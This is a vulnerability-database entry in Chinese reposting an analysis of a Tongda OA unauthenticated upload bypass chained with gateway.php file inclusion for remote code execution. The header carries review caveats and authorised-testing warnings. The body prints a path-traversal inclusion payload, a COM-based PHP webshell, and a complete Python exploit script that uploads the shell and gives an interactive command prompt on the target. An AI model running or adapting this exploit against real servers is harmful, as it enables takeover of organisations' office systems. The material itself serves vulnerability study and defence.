---
source: "MrWQ/vulnerability-paper"
title: "通达OA ispirit/im upload绕过及gateway本地包含"
product: "通达OA"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "上传2013–2017/V11；称仅2017/V11有包含；Windows COM"
prerequisites: "P非空绕过"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；在线解密或外部服务可能收到凭据及敏感内容"
review_date: "2026-10-02"
source_url: "https://github.com/MrWQ/vulnerability-paper"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BE%20OA%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90.md"
category_recommendation: "OA / 通达"
id: "vw-9fc7080a026a5ed46331c092"
entity_id: "ve-9fc7080a026a5ed46331c092"
schema_version: "1"
---

# 通达OA ispirit/im upload绕过及gateway本地包含

## 条目说明

- 对象与具体问题：通达OA；ispirit/im upload绕过及gateway本地包含
- 版本、配置及部署条件：上传2013–2017/V11；称仅2017/V11有包含；Windows COM
- 认证与权限前提：P非空绕过
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 参数/路径分析较完整但源码多为截图；DEST_UID条件需保留实际代码
- 脚本固定2003目录、断行字符串、Markdown转义导致不可直接复用
- 在线解密会传源码给第三方，应提示保密风险优先本地
- 与234版本范围冲突，上传/包含/COM条件分开

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；在线解密或外部服务可能收到凭据及敏感内容。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/gurRWW4HPFYIsEBGrboYug)

影响

影响范围 (但是只有 V11 版和 2017 版有包含文件的 php, 其余版本能上传文件.):  

V11 版 2017 版 2016 版 2015 版 2013 增强版 2013 版。

这个漏洞是几个月前的漏洞，主要是学习一下这个漏洞代码的形成原理和调式过程。

该漏洞主要是通过绕过身份验证的情况下上传文件，然后通过文件包含漏洞实现代码执行

代码分析

源码经过 zend 5.4 加密, 解密工具:

SeayDzend, 可以自行百度下载

![](../../.resource/remote/bd421a31117c49339237f7240d40a393ffc1ed2b94735ab49dc24ef1a8a6ca09.png)

在线解密

http://dezend.qiling.org/free.html

任意文件上传的关键文件

webroot\\ispirit\\im\\upload.php

代码分析:

![](../../.resource/remote/6fef23e3a0c4089f891587b2f7a8f8cdc8c14c5c1336a190329959102a41792c.png)

可以看到只要判断 P 参数是否不为空，就开启了 session

没有 P 参数时候

![](../../.resource/remote/7ec4a5d43506547fb3490dc4a883a0e94d336a6f37e11b00b5c0c02f4874f06e.png)

有的时候

![](../../.resource/remote/bf73c6d214ebebb92a7d1f31ee9e8739e612545fba623a280083fc80861aab2d.png)

继续往下走

![](../../.resource/remote/bbfb7551c874bed36d162c2edb9ab3ad52b26c885dd80ad7ae0af125a9b28ff7.png)

判断 DEST\_UID 是否不为空，否则就会退出

判断 DEST\_UID=0 的时候，如果 UPLOAD\_MODE 不等于 2 就直接退出了

判断 DEST\_UID 不等于 0 的时候直接判断 $\_FILES 数量是否有，也就是判断有没有上传文件

这里可以是第二个情况，DEST\_UID=0，UPLOAD\_MODE=2 进行下一步

![](../../.resource/remote/6567684cb6b81f3308f26e05954401cc63ae303acc2aee48a965784a34beb9c7.png)

也可以是 DEST\_UID 不为 0 进入下一步

![](../../.resource/remote/ffc6bc43980e715848bf3ebc43efff6e125abae8fc3a7352c0b71c497d7ac78f.png)

继续往下走

![](../../.resource/remote/6268d2e32318a04c9841fe386644471bf99fa2b7a43cbee4fd6f63006f9a62d2.png)

可以这里又 if 语判断上传的模式，我们来看看上传的模式有哪几种，可以看到总共有 1,2,3，其中 1,2,3 如果成功了是有回显的

![](../../.resource/remote/4b64607d46e9296e670fcaf274c47446bf377f62f5f62af738890dc2328dd370.png)

![](../../.resource/remote/a3a0ae95f3cc2c8f46f9b6de92687f7221f6fdcbe3d7db969d7d44edfb65eb14.png)

这里设置 upload\_mode 为 1，进入 upload 函数

![](../../.resource/remote/88d7976b836b96de24e8f729767945b9dc84b1f286f65209c799ae82c9fd306e.png)

![](../../.resource/remote/bd40d3768bc3df68b42c6831cdcf380f74c058bd5d30af7e07fc4baa80fcdfc4.png)

会判断是否 / 字符，然后判断上传的文件是否符合可上传的格式，我们继续走 is\_uploadable

![](../../.resource/remote/2ea9cb040177632ff7fa1805509f304942ef5d474b976446313e49c6c4867b1f.png)

可以看到如果上传的格式是 php，会返回 false, 这里用 xxx.php. 绕过

回过头来看 upload 函数，最终会返回一个 $ATTACHMENTS 的数组，包含了 ID，和 NAME

![](../../.resource/remote/4eaab346102951b4ed2ff007c0569424327908a499c4dfc012a9d68a1cf50dbc.png)

继续跟进，发现 ATTACHMENTS 是由 add\_attach 函数生成的

![](../../.resource/remote/4663c6742858666d9d7cf813bda53ecd10a71c4f47ea17bca2b652df159af57a.png)

继续跟进

发现 $FILENAME 的拼成

![](../../.resource/remote/5b8fb61bea00acd3632f8385ebb3a8b70416a2e73968e7f003eba5a68658ec3e.png)

继续往下走的时候发现 $path，和文件名的最终结果

![](../../.resource/remote/6912578b80337bf167ab659c496fe2a1fe3d4062cf4197e3d3c657b89db19813.png)

各种追踪发现就是 attch/im/$YM / 文件夹下面

![](../../.resource/remote/00050495ba9244fc58921ebfadb2034c10e6cd23feed3a3c4a73ca8527709a37.png)

其实不用这么复杂，就直接上传文件，然后搜索那个文件最终放在哪不就完事了吗？或者使用火绒剑分析行为和 D 盾进行文件监控

上传结合前面的分析需要的参数有

![](../../.resource/remote/03c4d284d626650b85cae86f56612b74e820896fdb5f58e7c6d835785e4d4f08.png)

这里不同的上传模式，回显的格式不一样，这里的 2 格式舒服点，目录就是 2003, 文件名对应后面的 ID

![](../../.resource/remote/12ec2db419ffb78c481b29e82d6577614a3e89e21748eed67fd638dd0e6e2c61.png)

![](../../.resource/remote/abef76ea8e8a200b0607eaa6615fcebf527638c5b1520ad7d514f0af1a7b3a4d.png)

由于这里的关键上传了文件后 OA 系统有个文件包含漏洞，结合文件包含漏洞就可以实现 RCE

文件包含代码位置

/ispirit/interface/gateway.php  

![](../../.resource/remote/bab6933ebfdba60b35f126e62ff59c76ba4f070247d76cbeaefba27f53f88343.png)

首先会接受一个 json 数据，然后转换为数组，然后遍历这个数据，如果 key 是 url，url 就对应值

然后继续走

![](../../.resource/remote/d0a6fefc1023858c81fc6a38de16ff488200686fde55aa528be1eb0b58b7efa3.png)

然后走到 strpos，可以看到如果出现 general/，ispirit，module / 就会触发文件包含构造 payload

/general/../../attach/im/2003/1191415788.1.php

由于我上传的时候是 phpinfo 函数，是禁用了这个函数的和危险函数，这里可以使用写入一个 webshell 在当前执行的 / ispirit/interface / 目录下

![](../../.resource/remote/b31466a8298cfbc5426078d2a39adaefc362b01200247e396a77bb37df0c3e2a.png)

记得这里文件名前面要加个 \\

![](../../.resource/remote/deea201613a7e6c9d816e7292c649202b7ee59bc43157576d0c20519c858dd30.png)

![](../../.resource/remote/5fc11aedcde5b34d10654bdcf38fc5b389fa67e7dd063d47537c7bf15d8ae81c.png)

![](../../.resource/remote/fc1cffc0060eee80d40662dee0da27e2b5a54e923670453ab9ccd1df5e60e8d7.png)

当然也可以使用 COM 组件 bypass 危险函数

```
<?php
$command=$\_POST\['cmd'\];
$wsh = new COM('WScript.shell');
$exec = $wsh->exec("cmd /c ".$command);
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput;
?>
```

也可以直接使用文件包含配合日志 getshell

直接触发 nginx 的错误日志，利用文件包含直接 getshell

利用网上公开的脚本：

```
#!/usr/bin/env python3
# -\*- encoding: utf-8 -\*-
# oa通达文件上传加文件包含远程代码执行
import requests
import re
import sys

def oa(url):
    upurl = url + '/ispirit/im/upload.php'
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Content-Type": "multipart/form-data; boundary=---------------------------27723940316706158781839860668"}
    data = "-----------------------------27723940316706158781839860668\\r\\nContent-Disposition: form-data; name=\\"ATTACHMENT\\"; filename=\\"jpg\\"\\r\\nContent-Type: image/jpeg\\r\\n\\r\\n<?php\\r\\n$command=$\_POST\['cmd'\];\\r\\n$wsh = new COM('WScript.shell');\\r\\n$exec = $wsh->exec(\\"cmd /c \\".$command);\\r\\n$stdout = $exec->StdOut();\\r\\n$stroutput = $stdout->ReadAll();\\r\\necho $stroutput;\\r\\n?>\\n\\r\\n-----------------------------27723940316706158781839860668\\r\\nContent-Disposition: form-data; name=\\"P\\"\\r\\n\\r\\n1\\r\\n-----------------------------27723940316706158781839860668\\r\\nContent-Disposition: form-data; name=\\"DEST\_UID\\"\\r\\n\\r\\n1222222\\r\\n-----------------------------27723940316706158781839860668\\r\\nContent-Disposition: form-data; name=\\"UPLOAD\_MODE\\"\\r\\n\\r\\n1\\r\\n-----------------------------27723940316706158781839860668--\\r\\n"
    req = requests.post(url=upurl, headers=headers, data=data)
    filename = "".join(re.findall("2003\_(.+?)\\|",req.text))
    in\_url = url + '/ispirit/interface/gateway.php'
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "X-Forwarded-For": "127.0.0.1", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded"}
    data = "json=
{\\"url\\":\\"../../../general/../attach/im/2003/%s.jpg\\"}&cmd=%s" % 
(filename,"echo php00py")
    include\_req = requests.post(url=in\_url, headers=headers, data=data)
    if  'php00py' in include\_req.text:
        print("\[+\] OA RCE vulnerability ")
        return filename
    else:
        print("\[-\] Not OA RCE vulnerability ")
        return False
def oa\_rce(url, filename,command):
    url = url + '/ispirit/interface/gateway.php'
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded"}
    data = "json=
{\\"url\\":\\"../../../general/../attach/im/2003/%s.jpg\\"}&cmd=%s" % 
(filename,command)
    req = requests.post(url, headers=headers, data=data)
    print(req.text)

if \_\_name\_\_ == '\_\_main\_\_':
        if len(sys.argv) < 2:
            print("please input your url python oa\_rce.py http://127.0.0.1:8181")
        else:
            url = sys.argv\[1\]
            filename = oa(url)
            while filename:
                try:
                    command = input("wran@shelLhost#")
                    if command == "exit" or command == "quit":
                        break
                    else:
                        oa\_rce(url,filename,command)
                except KeyboardInterrupt:
                    break
```

![](../../.resource/remote/2f5b557ee870733370408088af23f60f9408861bc6355c5df66e3eadc24ee672.png)

脚本用的是 COM 绕过

end

  

![](../../.resource/remote/83105b48d66471ec0ef98b3f0199f74f3811bd83cc21a78d5198e9800ab54316.png)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
